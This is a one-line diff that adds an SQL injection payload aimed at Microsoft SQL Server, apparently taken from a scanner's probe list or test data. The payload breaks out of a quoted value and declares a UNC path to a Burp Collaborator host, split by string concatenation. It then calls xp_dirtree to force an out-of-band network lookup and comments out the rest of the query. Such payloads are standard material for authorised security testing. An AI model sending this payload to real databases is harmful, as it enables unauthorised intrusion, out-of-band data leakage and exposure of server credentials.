@@ -1,0 +1,1 @@
+8lreM0B9Hm);declare @q varchar(99);set @q='\\quoufbak2dlk2ba7jsh4nx2w9nfg3ez2quem1fp4.burpcollab'+'orator.net\vep'; exec master.dbo.xp_dirtree @q;-- 
